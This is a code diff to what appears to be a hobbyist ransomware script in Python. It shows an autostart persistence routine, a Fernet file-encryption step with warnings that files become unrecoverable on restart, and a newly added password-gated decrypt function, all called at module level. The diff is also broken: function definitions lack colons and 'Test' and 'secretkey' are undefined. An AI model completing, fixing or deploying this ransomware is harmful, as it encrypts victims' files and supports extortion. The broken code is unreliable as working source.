@@ -3,7 +3,9 @@ import sys
 from cryptography.fernet import Fernet
 
 files = []
-key = "0"
+key = 0
+passkey = Test
+code = 0
 
 def autostart():
     # Path to Autostart
@@ -45,9 +47,22 @@ def encrypt()
     print("When you change the stuff standing in your Files, is gone too so dont do that")
     print("And if you try to restart your Pc its not decryptabel too")
 
-
+def decrypt()
+    code = input("Enter the password: ")
+    if code == passkey:
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+            contents_decrypted = Fernet(secretkey).decrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_decrypted)
+    else:
+        print("That was Wrong, Sorry Bro")
+        
+    
 #Execute the definitions    
 #if __name__ == '__main__':
 #    autostart()
 autostart()
 encrypt()
+decrypt()
